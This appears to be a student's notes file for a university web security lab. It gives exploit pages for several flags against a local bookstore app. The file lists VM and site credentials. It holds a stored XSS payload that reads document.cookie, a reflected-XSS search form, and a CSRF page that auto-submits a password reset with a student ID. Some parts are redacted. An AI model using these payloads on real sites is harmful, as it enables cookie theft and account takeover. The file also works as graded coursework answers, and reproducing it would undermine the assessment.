@@ -1,0 +1,251 @@
+https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Web_Security/
+
+Basic web technologies, HTML, CSS & JavaScript
+The HTTP protocol
+XSS (Cross-Site Scripting) Attacks
+XSRF (Cross-Request Forgery)
+SQLi (Sql Injection Attacks)
+Mis-configuration of server side web servers
+Client-side JavaScript library vulnerabilities
+REST
+
+https://www.youtube.com/watch?v=lsMQRaeKNDk
+
+VM Credentials:
+
+
+Login: websec
+
+Password: Kurt_Cobain
+
+
+Username: ilovetoread
+Password: TheGreatGatsby123
+The Bookstore Website uses a database to store data. In some cases you may find the need to reset this database. There are also times when the student grader will reset the database before running your exploit. To do this manually navigate to this URL and click the button to reset the database:
+http://localhost:7149/database
+
+    ./StudentGrader.sh --flag X --gaTechId Y --filePath Z
+
+
+
+
+Flag 1: Web Intro - 25 Points
+
+https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Web_Security/Flag1.html
+
+
+
+Flag 2
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <title>Bookstore Review</title>
+</head>
+<body>
+    <script>
+        async function addReview() {
+            try {
+                // Post the review data to the server
+                let response = await fetch(`http://localhost:7149/api/review/6`, {
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    method: "POST",
+CENSORED 
+
+
+
+
+                // Redirect to the correct URL for Hamlet's book page
+                const bookId = 6; // Assuming the book ID for Hamlet is 6
+                const redirectUrl = `http://localhost:7149/book/${bookId}`;
+                window.location.href = redirectUrl;
+            } catch (error) {
+                console.error("Error posting the review:", error);
+                alert("An error occurred while submitting your review. Please try again.");
+            }
+        }
+
+        addReview();
+    </script>
+</body>
+</html>
+
+
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <meta charset="utf-8" />
+
+    <title>Flag 3</title>
+
+</head>
+
+<body>
+
+    <!-- TODO: Navigate to a search page and inject XSS  -->
+
+    <form id=":r0:" method="GET" action="http://localhost:7149/search">
+CENSORED 
+
+        // submit the form
+
+        
+
+        document.getElementById(":r0:").submit();
+
+    </script>
+
+</body>
+
+</html>
+
+
+
+
+
+Flag 2
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <meta charset="utf-8" />
+
+    <title>Bookstore Review</title>
+
+</head>
+
+<body>
+
+    <script>
+
+        async function addReview() {
+
+        
+
+          let xssScript = `<img src=x onerror="document.getElementById('headerText').innerText = document.cookie" />`;
+
+
+
+            try {
+
+                // Post the review data to the server
+
+                let response = await fetch(`http://localhost:7149/api/review/6`, {
+
+                    headers: {
+
+                        'Content-Type': 'application/json'
+
+                    },
+
+CENSORED 
+
+                        
+
+                        Rating: 3,
+
+                        Recommended: true 
+
+                    })
+
+                });
+
+
+
+                if (!response.ok) {
+
+                    throw new Error(`Failed to post review: ${response.status}`);
+
+                }
+
+
+
+                // Redirect to the correct URL for Hamlet's book page
+
+                const bookId = 6; // Assuming the book ID for Hamlet is 6
+
+                const redirectUrl = `http://localhost:7149/book/${bookId}`;
+
+                window.location.href = redirectUrl;
+
+            } catch (error) {
+
+                console.error("Error posting the review:", error);
+
+                alert("An error occurred while submitting your review. Please try again.");
+
+            }
+
+        }
+
+
+
+        addReview();
+
+    </script>
+
+</body>
+
+</html>
+
+
+
+Flag 4
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+  <meta charset="UTF-8" />
+
+  <title>Flag 4</title>
+
+  <script src="http://localhost:7149/tokenGenerator.js"></script>
+
+</head>
+
+
+
+<body onload="document.getElementById('myForm').submit();">
+
+  
+
+  <form action="http://localhost:7149/api/profile/reset-password" method="POST" id="myForm">
+
+  <input type="hidden" id="outlined-adornment-password" name = "password" value="TheGreyGoose21" />
+
+    <input type="hidden" id="gtId" name="gtId" value="904049121" />
+
+CENSORED 
+
+
+
+
+
+  
+CENSORED 
+
+  document.getElementById('randomNumber').value = randoNum;
+
+  document.getElementById('token').value = token;
+
+  
+
+  </script>
+
+</body>
+
+</html>
+
